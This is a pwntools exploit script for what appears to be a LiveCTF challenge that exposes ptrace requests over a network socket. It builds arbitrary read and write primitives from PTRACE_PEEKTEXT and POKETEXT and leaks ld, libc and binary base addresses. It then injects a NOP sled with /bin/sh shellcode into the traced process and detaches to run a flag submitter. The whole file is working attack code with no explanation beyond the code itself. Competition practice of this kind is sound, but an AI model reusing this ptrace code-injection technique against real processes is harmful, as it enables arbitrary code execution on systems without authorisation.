#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.update(arch='amd64', os='linux')

# elf = ELF("./challenge", checksec=False)
# ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)

io = remote(HOST, PORT)
# io = process("./challenge")

def ptrace(request, addr, data, retry=True):
	io.sendlineafter(b"send?\n", hex(request)[2:].encode())
	io.sendlineafter(b"want?\n", hex(addr)[2:].encode())
	io.sendlineafter(b"data?\n", hex(data)[2:].encode())
	io.recvuntil(b" 0x")
	data = int(io.recvuntil(b"\n", drop=True), 16)

	if retry:
		io.sendlineafter(b"(0/1)?\n", b'1')
	else:
		io.sendlineafter(b"(0/1)?\n", b'0')

	return data

def arb_read64(addr, retry=True):
	return ptrace(PTRACE_PEEKTEXT, addr, 0, retry)

def arb_write64(addr, value, retry=True):
	if ptrace(PTRACE_POKETEXT, addr, value, retry):
		print("Error when writing to %#x" % addr)

def write_data(addr, buf):
	for i in range(0, len(buf), 8):
		arb_write64(addr + i, u64(buf[i:i+8].ljust(8, b'\0')))

def detach():
	ptrace(PTRACE_DETACH, 0, 0)

PTRACE_PEEKTEXT = 1
PTRACE_PEEKUSER = 3
PTRACE_POKETEXT = 4
PTRACE_DETACH = 17

leak = ptrace(PTRACE_PEEKUSER, 0, 0)

ld_base = leak - 0x3a040

# print("leak       @ %#x" % leak)
# print("ld_base    @ %#x" % ld.address)

_dl_exception = arb_read64(ld_base + 0x3a018)

libc_base = _dl_exception - 0x174ba0

# print("libc_base  @ %#x" % libc.address)

_rtld = arb_read64(ld_base + 0x3a040)

# print("_rtld      @ %#x" % _rtld)

elf_address = arb_read64(_rtld)

# print("elf_base   @ %#x" % elf.address)

shellcode = b"\x90"*0x800 + asm(shellcraft.amd64.linux.sh())

write_data(elf_address + 0x1000, shellcode)

detach()

io.sendline(b";./submitter")

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('%s', flag)

# io.interactive()
# io.close()